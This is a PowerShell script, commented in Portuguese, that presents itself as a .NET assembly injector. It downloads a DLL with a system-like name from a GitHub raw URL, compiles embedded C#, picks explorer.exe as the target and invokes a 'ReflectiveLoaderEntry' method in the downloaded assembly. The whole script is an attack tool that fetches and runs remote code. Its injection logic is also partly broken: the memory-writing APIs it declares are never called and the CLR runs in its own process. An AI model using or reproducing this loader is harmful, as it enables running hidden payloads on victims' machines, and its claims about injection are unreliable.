# ===================================================================
# Injetor de Assembly .NET via CLR Hosting v2.0
# ===================================================================

# --- ETAPA 1: DOWNLOAD DA DLL PAYLOAD ---
$urlDll = "https://github.com/bragaawy/pjl/raw/main/WinCoreUptime.dll"
try {
    Write-Host "Baixando a DLL Payload..."
    $webClient = New-Object System.Net.WebClient
    $bytesDll = $webClient.DownloadData($urlDll )
    Write-Host "DLL Payload baixada com sucesso."
}
catch {
    Write-Host "ERRO FATAL: Falha ao baixar a DLL Payload."
    if ($Host.Name -eq "ConsoleHost") { $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null }
    return
}

# --- ETAPA 2: DEFINIÇÃO DO MOTOR DE INJEÇÃO E CLR HOSTING ---
$codigoInjetor = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class ClrHostInjector
{
    // --- Definições da API do Windows ---
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);
    [DllImport("mscoree.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int CLRCreateInstance(ref Guid clsid, ref Guid riid, [MarshalAs(UnmanagedType.Interface)] out ICLRMetaHost metaHost);
    
    // --- Interfaces para CLR Hosting ---
    [ComImport, Guid("D332DB9E-B9B3-4125-8207-A14884F53216"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICLRMetaHost {
        void GetRuntime(string pwzVersion, ref Guid riid, [MarshalAs(UnmanagedType.Interface)] out ICLRRuntimeInfo runtimeInfo);
    }
    [ComImport, Guid("BD39D1D2-BA2F-486A-89B0-A4B0CB466891"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICLRRuntimeInfo {
        void GetInterface(ref Guid rclsid, ref Guid riid, [MarshalAs(UnmanagedType.Interface)] out ICorRuntimeHost runtimeHost);
    }
    [ComImport, Guid("CB2F6723-AB3A-11D2-9C40-00C04FA30A3E"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICorRuntimeHost {
        void Start();
        void GetDefaultDomain(out IntPtr pAppDomain);
    }

    // Constantes
    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT_RESERVE = 0x3000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Inject(byte[] dllBytes)
    {
        Process targetProcess = null;
        try
        {
            Process[] explorerProcs = Process.GetProcessesByName("explorer");
            if (explorerProcs.Length == 0) { throw new Exception("'explorer.exe' não encontrado."); }
            targetProcess = explorerProcs[0];

            // --- Inicia o CLR no processo alvo ---
            ICLRMetaHost metaHost = null;
            ICLRRuntimeInfo runtimeInfo = null;
            ICorRuntimeHost runtimeHost = null;

            Guid clsidMetaHost = new Guid("9280188D-0E8E-4867-B30C-7FA83884E8DE");
            Guid riidMetaHost = new Guid("D332DB9E-B9B3-4125-8207-A14884F53216");
            CLRCreateInstance(ref clsidMetaHost, ref riidMetaHost, out metaHost);

            Guid riidRuntimeInfo = new Guid("BD39D1D2-BA2F-486A-89B0-A4B0CB466891");
            metaHost.GetRuntime("v4.0.30319", ref riidRuntimeInfo, out runtimeInfo);

            Guid clsidRuntimeHost = new Guid("CB2F6723-AB3A-11D2-9C40-00C04FA30A3E");
            Guid riidRuntimeHost = new Guid("CB2F6723-AB3A-11D2-9C40-00C04FA30A3E");
            runtimeInfo.GetInterface(ref clsidRuntimeHost, ref riidRuntimeHost, out runtimeHost);

            // --- Prepara o código C# para ser executado no alvo ---
            string loaderCode = @"
                using System.Reflection;
                public class RemoteLoader {
                    public static void Load(byte[] assemblyBytes) {
                        Assembly a = Assembly.Load(assemblyBytes);
                        MethodInfo m = a.GetType(""ReflectiveLoader"").GetMethod(""ReflectiveLoaderEntry"");
                        m.Invoke(null, null);
                    }
                }";

            // --- Executa o código no AppDomain padrão do processo alvo ---
            runtimeHost.Start();
            IntPtr pAppDomain;
            runtimeHost.GetDefaultDomain(out pAppDomain);
            var appDomain = (System.AppDomain)Marshal.GetObjectForIUnknown(pAppDomain);
            
            // Carrega o nosso Assembly (a DLL) no AppDomain alvo
            var remoteAssembly = appDomain.Load(dllBytes);
            // Encontra e invoca o método de entrada
            remoteAssembly.GetType("ReflectiveLoader").GetMethod("ReflectiveLoaderEntry").Invoke(null, null);

            Console.WriteLine("Injeção via CLR Hosting concluída com sucesso.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("ERRO FATAL na injeção: " + ex.ToString());
        }
    }
}
"@

# --- ETAPA 3: COMPILAÇÃO E EXECUÇÃO ---
try {
    Write-Host "Compilando o motor de injeção CLR..."
    Add-Type -TypeDefinition $codigoInjetor -Language CSharp
    Write-Host "Motor de injeção compilado."
}
catch {
    Write-Host "ERRO FATAL: Falha ao compilar o motor de injeção."
    if ($Host.Name -eq "ConsoleHost") { $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null }
    return
}

Write-Host "Injetando a DLL no explorer.exe via CLR Hosting..."
[ClrHostInjector]::Inject($bytesDll)

Write-Host "Operação concluída."
